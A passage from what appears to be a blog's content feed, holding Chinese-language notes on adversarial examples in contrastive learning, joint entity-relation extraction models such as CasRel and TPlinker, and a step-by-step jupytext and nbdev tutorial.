src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325184222198.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>假设从 <span class="math inline">\(\eta\)</span>网络输出就假设为当前期望估计。更新<span class="math inline">\(\theta\)</span>就是在计算最优化损失。所以，计算期望时，自然是不更新<span class="math inline">\(\theta\)</span>的。</p><p>这里predictor的作用也是假设loss是在两侧 expectation上进行计算的，这只是假设，严格证明没有。</p><p>这因为EM显示的合理性，所以在 stop-gradient时，模型能够收敛到一个好的结果。而如果不进行stop-gradient，训练反而会变得不稳定。</p><h3><span id="contrastivelearning-with-adversarial-examples">ContrastiveLearning with Adversarial Examples</span></h3><p>理论偏研究，没有开源实现。</p><p>基于SimCLR框架，选择能最大化差异的样本，然后再使之相似性损失最小化。</p><p>将SimCLR损失写成：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325170733648.png" srcset="/img/loading.gif" lazyload></p><p>然后固定一个增广样本输入，然后找差异最大的另一个：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325170834493.png" srcset="/img/loading.gif" lazyload></p><p>计算扰动：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325171007836.png" srcset="/img/loading.gif" lazyload></p><p>得到对抗样本：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325171036935.png" srcset="/img/loading.gif" lazyload></p><p>计算损失（16）：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325171308159.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>算法设计：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325171359577.png" srcset="/img/loading.gif" lazyload></p><p>计算 <span class="math inline">\(W^*\)</span>（15）:</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325171534637.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325171557166.png" srcset="/img/loading.gif" lazyload></p><h3><span id="more">More</span></h3><h4><span id="adversarialexamples-improve-image-recognition">AdversarialExamples Improve Image Recognition</span></h4><p><a href="https://arxiv.org/abs/1911.09665" target="_blank" rel="noopener">paper</a>，<a href="https://github.com/tensorflow/tpu/tree/master/models/official/efficientnet?utm_source=catalyzex.com">在EfficientNet中使用的效果评测</a></p><p>提升的基本思想，加入对抗样本，联合原数据进行训练</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325173002725.png" srcset="/img/loading.gif" lazyload></p><p>max部分为求得最大化差异的对抗样本损失。</p><p>但是，实际效果并不好，因为原数据与对抗样本的分布不匹配。所以提出，两个BN分布处理原数据和对抗样本。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325173301941.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325173341416.png" srcset="/img/loading.gif" lazyload></p><p>然后，在预测时，只使用主BN层。</p><p>当模型越大，效果提升越明显。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Contrastive Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> self-supervise </tag>
            
            <tag> contrastive learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Joint Extraction of Entities and Relations 2020</title>
      <link href="/posts/aa5b647c.html"/>
      <url>/posts/aa5b647c.html</url>
      
        <content type="html"><![CDATA[<h2><span id="casrel">CasRel</span></h2><p><a href="https://github.com/weizhepei/CasRel" target="_blank" rel="noopener">git</a></p><p>实体识别和关系分类一体化，使用一个model解决两个问题。优势在于，通过两个任务的相关性，设计model，减少两阶段预测中的级联误差。虽然，也有两阶段模型实际效果可以很好。</p><p>除了解决级联误差，还需要解决什么问题？</p><ul><li>Overlappingrelations：一个实体可以出现则同一文本中的多个关系中。</li><li>Nested relations：不同的三元组可能包含或共享嵌套实体。</li></ul><table><colgroup><col style="width: 17%"><col style="width: 41%"><col style="width: 41%"></colgroup><thead><tr class="header"><th></th><th>Texts</th><th style="text-align: left;">Triplets</th></tr></thead><tbody><tr class="odd"><td>Normal</td><td>[The United States] President [Trump] will meet [Xi Jinping], thepresident of [China].</td><td style="text-align: left;">(The United States, <em>president</em>,Trump) <br>(China, <em>president</em>, Xi Jinping)</td></tr><tr class="even"><td>Single Entity Overlapping</td><td>Two of them, [Jeff Francoeur] and [Brian McCann], are from<strong>[Atlanta]</strong>.</td><td style="text-align: left;">(Jeff Francoeur, <em>live in</em>,<strong>Atlanta</strong>) <br>(Brian McCann, <em>live in</em>,<strong>Atlanta</strong>)</td></tr><tr class="odd"><td>Entity Pair Overlapping</td><td>The new mayor of [<strong>New York City</strong>] [<strong>DeBlasio</strong>] is native-born.</td><td style="text-align: left;">(<strong>New York City</strong>,<em>mayor</em>, <strong>De Blasio</strong>) <br>(<strong>DeBlasio</strong>, <em>born in</em>, <strong>New York City</strong>)</td></tr><tr class="even"><td>Nested</td><td>The new mayor of <strong>[[New York] City]</strong> [De Blasio] isnative-born.</td><td style="text-align: left;">(De Blasio, <em>live in</em>, <strong>NewYork City</strong>) <br>(De Blasio, <em>live in</em>, <strong>NewYork</strong>) (<strong>New York</strong>, <em>contains</em>,<strong>New York City</strong>)</td></tr></tbody></table><p>同时，还存在的问题有：预测标签的不平衡，相同实体出现不同关系时model难以拟合。</p><h3><span id="framework">framework</span></h3><p>CasRel是一种framework，将关系预测从标注分类转化为一个隐式变换，参与模型训练：<span class="math display">\[f(s, o) \rightarrow r\]</span> 本来是subject + object推断relation，变化为： <span class="math display">\[f_r(s) \rightarrow o\]</span> 将relation建模成一种function。</p><p>将likelihood变成以下形式：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324205241218.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>模型整体架构</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324210312814.png" srcset="/img/loading.gif" lazyload alt style="zoom:60%;"></p><p>模型在多个关系抽取任务上，效果提升明显。</p><h2><span id="tplinker">TPlinker</span></h2><p><a href="https://github.com/131250208/TPlinker-joint-extraction">git</a></p><p>TPlinker是不同于现有模型的一种一体式关系抽取模型。解码方式独特。</p><ul><li>通过实体边界词，区分嵌套实体：New York City -&gt; (New, City), NewYork -&gt; (New, York)</li><li>通过实体边界，分解三元组：(De Blasio, <em>live in</em>, New YorkCity) -&gt; (De, <em>live in</em>, New) and (Blasio, <em>live in</em>,City)</li></ul><blockquote><p>两种常见的处理 relation overlapping 的模式：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324211459890.png" srcset="/img/loading.gif" lazyload alt></p><p>都同时存在两个问题：</p><ul><li><strong>暴漏偏差（exposure bias）</strong>：指在训练阶段是gold实体输入进行关系预测，而在推断阶段是上一步的预测实体输入进行关系判断；导致训练和推断存在不一<strong>致</strong></li><li><strong>嵌套实体（nestedentities）</strong>：并没有有效处理嵌套实体关系。</li></ul></blockquote><h3><span id="tplinker的标注方式">TPlinker的标注方式</span></h3><p>首先对不同的关系，分别进行标注。每种关系的标注方式相同。</p><p>三类标记：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324213705783.png" srcset="/img/loading.gif" lazyload alt></p><p>紫色标记：单个实体的头尾对应关系。和关系类型无关。shape: len(text) *len(text)</p><p>红色标记：对应 subject和object 的start对应标记。每种关系一个单独标记矩阵。shape: R * len(text) *len(text)</p><p>蓝色标记：对应 subject和object 的end对应标记。每种关系一个单独标记矩阵。shape: R * len(text) *len(text)</p><p>同时，红色标记和蓝色标记，在len(text) *len(text)的矩阵中，存在两个对称的标记，比如（New, De）与 (De,New)。为了提高效率，将下三角部分映射到上三角部分，同时值变成2。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324214913819.png" srcset="/img/loading.gif" lazyload alt></p><p>模型为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324215304975.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>图中 Handshaking Kernel，就是将 标记矩阵展开得到的一维编码。tokenpair 遍历了所有可能的 对应关系。图中S -- subject；O -- object; H --head; T -- tail； E -- entity</p><p>通过这些标记，训练模型计算损失，token pair的encoderoutput拼接在一起，输入softmax，每个关系类型都有一个softmax。</p><h3><span id="解码过程">解码过程</span></h3><ol type="1"><li>预测模型计算结果</li><li>结果EH-to-ET可以得到句子中所有的实体，EH的 tokenidx作为key，EH-to-ET的entity作为value，存入 D 中，得到可选实体；</li><li>开始遍历 不同关系；</li><li>结果SH-to-OH可以得到某种关系可选的 head 对应关系，取这些headindex，从 D 中，取出对应实体对 token pair 存于 D2；</li><li>结果ST-to-OT可以得到某种关系可选的 tail 对应关系，将这个对应关系的token pair 存入 E；</li><li>遍历D2，并检查 每一个 D2中的 token pair 的 tail 是否存在于 E中，若存在，那么输出 该关系下的该三元组信息。</li></ol><h3><span id="more">More</span></h3><p>实体对输出的embedding表示是直接concatenate，那么如果两个实体的context相似，那么理论上会影响预测效果。</p><p>由于要预测 N 个词中选 2 的排列个pair，所以对于长文本，代价会很大。</p><h2><span id="two-are-better-than-one">Two-are-better-than-one</span></h2><p><a href="https://github.com/LorrinWWW/two-are-better-than-one">git</a></p><p>统一NER和RE任务到一个表格标记预测任务。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324225007546.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>标记形式很直观。只是这在14年就已经有这种方法的尝试了。这篇论文作者是对其进行了改进。</p><p>除了一些关系抽取任务常见的问题，这种标记方式还有一个问题：</p><ul><li>现有的基于Table-Filling方法，会将<strong>表结构</strong>转化成一个序列结构，表结构的标记方式直接退化。</li></ul><h3><span id="结构设计">结构设计</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324225525330.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>首先是 TextEmbedding：Glove词向量、LSTM字符向量和BERT词向量的共同构成。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324225748873.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>Table Encoder：学习表格中每个位置的向量表达，shape: len(text) *len(text)。表格第 i 行第 j 列的向量表示，与句子中的第 i 个和第 j个词相对应。</p><p>使用 MD-RNN 融合表格中上下左右的信息。接收 Sequence Encoder 编码的当前 第 i 、第 j 个词的向量表示。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324230418560.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324230736097.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>但是，论文实验发现，不必计算四组，只需要两组，就能达到几乎无损的效果。只计算a 和 c。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324230850746.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>Sequence Encoder：SequenceEncoder的结构与Transformer类似，不同之处在于将Transformer中的scaleddot-product attention 替换为 table-guided attention。</p><p>原 transformer 的 attention ：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324230944854.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>变为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324231145240.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>直接使用 <span class="math inline">\(T_{l,i,j}\)</span>节省了计算量，同时交互两个部分信息。</p><p>Pre-trained Attention Weights：利用预训练的 BERT 中每一层的 attention信息，得到 <span class="math inline">\(T^l\)</span> ，联合 S构成MD-RNN的初始输入 。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324232211689.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>预测结果表示为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/一些关系抽取model_pic/image-20210324232521827.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>表格中对称位置，在预测时直接求和，得到一个关系的得分。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> relation extraction </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jupytext and nbdev</title>
      <link href="/posts/c1cb8a12.html"/>
      <url>/posts/c1cb8a12.html</url>
      
        <content type="html"><![CDATA[<h2><span id="jupytext">Jupytext</span></h2><h3><span id="界面点击操作">界面点击操作</span></h3><p>当你 Pair 一种文件，保存时，会自动生成你 pair关联的格式的文件。在其中一个文件修改的任何文本都会同步到两个文件中。</p><p>首先你有文件</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext-and-nbdev_pic/image-20210112154512001.png" srcset="/img/loading.gif" lazyload></p><p>然后，在jupyter lab中 ctrl + shift + c，选择pair的文件类型（jupyternotebook在功能菜单中找到）</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext-and-nbdev_pic/image-20210112153908965.png" srcset="/img/loading.gif" lazyload></p><p>然后，保存</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext-and-nbdev_pic/image-20210112154745542.png" srcset="/img/loading.gif" lazyload></p><p>关联成功。<strong>py文件可以在自己喜欢IDE环境编辑</strong>，ipynb文件可以同步展示。删除任意一个，都可以再次恢复。</p><p>取消pair，则不会同步。（unpair 取消关联）</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext-and-nbdev_pic/image-20210112153940284.png" srcset="/img/loading.gif" lazyload></p><p>py文件中包含的 metadata 如下格式</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext-and-nbdev_pic/image-20210112154102238.png" srcset="/img/loading.gif" lazyload></p><h3><span id="命令行操作">命令行操作</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext-and-nbdev_pic/image-20210112154207803.png" srcset="/img/loading.gif" lazyload></p><p>Notebook to text</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">jupytext --to markdown notebook.ipynb<br>jupytext --to<span class="hljs-built_in"> script </span>notebook.ipynb<br></code></pre></div></td></tr></table></figure><p>text to notebook</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">jupytext --<span class="hljs-keyword">to</span> notebook notebook.<span class="hljs-keyword">py</span><br>jupytext --<span class="hljs-keyword">to</span> notebook notebook.md<br></code></pre></div></td></tr></table></figure><p>text to notebook and preserve outputs</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">jupytext --<span class="hljs-keyword">to</span> notebook --<span class="hljs-keyword">update</span> notebook.<span class="hljs-keyword">py</span><br>jupytext --<span class="hljs-keyword">to</span> notebook --<span class="hljs-keyword">update</span> notebook.md<br></code></pre></div></td></tr></table></figure><p>命令行pair操作</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">jupytext</span> <span class="hljs-selector-tag">--set-formats</span> <span class="hljs-selector-tag">ipynb</span>,<span class="hljs-selector-tag">py</span><span class="hljs-selector-pseudo">:percent</span> <span class="hljs-selector-tag">notebook</span><span class="hljs-selector-class">.ipynb</span><br></code></pre></div></td></tr></table></figure><p>同步paired notebooks，当在其他文件中修改后，同步到ipynb</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jupytext </span>--<span class="hljs-keyword">sync </span>notebook.ipynb<br></code></pre></div></td></tr></table></figure><p>应用code style(flake8, black, isort)</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">jupytext <span class="hljs-comment">--pipe flake8 notebook.ipynb</span><br></code></pre></div></td></tr></table></figure><h3><span id="支持文件格式">支持文件格式</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext-and-nbdev_pic/image-20210112155906188.png" srcset="/img/loading.gif" lazyload></p><hr><h2><span id="nbdev开发">NBDEV开发</span></h2><h3><span id="step-1-新建git">step 1 新建git</span></h3><p>使用 <a href="https://github.com/fastai/nbdev_template" target="_blank" rel="noopener">thetemplate</a> 创建一个github repo</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112164201446.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> nbdev<br></code></pre></div></td></tr></table></figure><p>可选，使用git自带的服务器：在setting中</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112164812568.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><p>在edit中添加生成的网址</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112165048834.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><h3><span id="step-2-编辑settingsini">step 2 编辑settings.ini</span></h3><p>编辑settings.ini（注意这里的lib_name就是生成的包名，所以有空格很不规范）。前面的个人相关信息基本都要取消注释，后面在git上创建网页展示环境要check。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112174117546.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/RacleRay/Hello_nbdev.git<br></code></pre></div></td></tr></table></figure><h3><span id="step-3-安装git_hooks">step 3 安装git_hooks</span></h3><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbdev_install_git_hooks</span><br></code></pre></div></td></tr></table></figure><p>出现conflict错误时</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">nbdev_fix_merge</span> <span class="hljs-selector-tag">filename</span><span class="hljs-selector-class">.ipynb</span><br></code></pre></div></td></tr></table></figure><h3><span id="step-4-编辑代码">step 4 编辑代码</span></h3><p>开始编辑ipynb文件</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112170552588.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><p>标记类别：</p><ul><li>#default_exp <module name></module></li></ul><blockquote><p>对于新创建的 .ipynb，需要加入<code>#default_exp target_module_name</code></p><p>这会导出生成以下py文件</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">lib_name/target_module_name.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure><p>lib_name与settings时，保持一致</p></blockquote><ul><li>#export：效果如下</li></ul><blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112171518061.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p>导出后显示如下</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112171534844.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p><strong>如果是类里面的方法</strong>，显示doc需要使用函数 show_doc</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nbdev,showdoc <span class="hljs-keyword">import</span> show_doc<br></code></pre></div></td></tr></table></figure></blockquote><ul><li>不加标记会显示代码和输出</li></ul><blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112171703161.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p>测试代码也可以写在这里，不代标记</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">assert</span> <span class="hljs-title">say_hello</span><span class="hljs-params">(<span class="hljs-string">"Jeremy"</span>)</span></span>==<span class="hljs-string">"Hello Jeremy!"</span><br></code></pre></div></td></tr></table></figure></blockquote><h3><span id="step-5-nbdev_build_lib">step 5 nbdev_build_lib</span></h3><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbdev_build_lib</span><br></code></pre></div></td></tr></table></figure><p>注意，发生keyError时，多半是settings.ini配置不完整</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112173202161.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p>生成新的lib包文件夹及py文件</p><p>core.py</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112173334030.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><h3><span id="step-6-编写index文件">step 6 编写index文件</span></h3><p>编辑index.ipnb</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112174652843.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><h3><span id="step-7-生成docs文档">step 7 生成docs文档</span></h3><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbdev_build_docs</span><br></code></pre></div></td></tr></table></figure><p>生成HTML文档</p><h3><span id="step-8-上传git">step 8 上传git</span></h3><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">git</span> <span class="hljs-string">add -A</span><br><span class="hljs-attr">git</span> <span class="hljs-string">status</span><br><span class="hljs-attr">git</span> <span class="hljs-string">commit -m "test"</span><br><span class="hljs-attr">git</span> <span class="hljs-string">push</span><br></code></pre></div></td></tr></table></figure><h3><span id="step-9-bug">step 9 bug</span></h3><p>检查 commits中的问题</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112180905111.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112180930480.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p>没有设置keywords，在settings.ini中进行设置。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112181936329.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:60%;"></p><h3><span id="optional-step-10-发布pypi">optional step 10 发布pypi</span></h3><p>上传到pypi</p><ol type="1"><li><p>注册pypi</p></li><li><p>在用户家目录下新建<code>~/.pypirc</code></p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[pypi]</span><br><span class="hljs-attr">username</span> = your_pypi_username<br><span class="hljs-attr">password</span> = your_pypi_password<br></code></pre></div></td></tr></table></figure></li><li><p>pip install twine</p></li><li><p>make release</p></li></ol><hr><h3><span id="附-其他事项">附 其他事项</span></h3><ul><li>安装包，同时同步所有在源码上的编辑</li></ul><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -e .<br></code></pre></div></td></tr></table></figure><ul><li>可以将自己开发的包链接到python包路径下</li></ul><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">ln -s lib_path lib_name</span><br></code></pre></div></td></tr></table></figure><ul><li>autoreload</li></ul><figure class="highlight haml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">load_ext</span></span> autoreload<br><span class="hljs-tag">%<span class="hljs-selector-tag">autoreload</span></span> 2<br></code></pre></div></td></tr></table></figure><ul><li>在ipynb结尾添加以下代码，用以代替命令行nbdev_build_lib。</li></ul><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> nbdev.<span class="hljs-keyword">export</span> <span class="hljs-keyword">import</span> notebook2script; notebook2script()<br></code></pre></div></td></tr></table></figure><ul><li><p>检查可读的notebook</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbdev_read_nbs</span><br></code></pre></div></td></tr></table></figure></li><li><p>检查可能造成merge conficts的文件，</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbdev_clean_nbs</span><br></code></pre></div></td></tr></table></figure><p>可能导致cleaned项不通过，此时用，然后再push</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/jupytext_pic/image-20210112210749768.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p></li><li><p>检查notebook和已经导出的lib files之间的是否有差异</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbdev_diff_nbs</span><br></code></pre></div></td></tr></table></figure></li><li><p>运行notebooks中的测试</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbdev_test_nbs</span><br></code></pre></div></td></tr></table></figure></li></ul><p><a href="https://nbdev.fast.ai/" target="_blank" rel="noopener">fastai文档</a> <a href="https://github.com/fastai/nbdev">nbdev git</a></p><p><a href="https://github.com/fastai/nbdev_template">nbdev_template</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jupyter </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pointer review</title>
      <link href="/posts/6875388b.html"/>
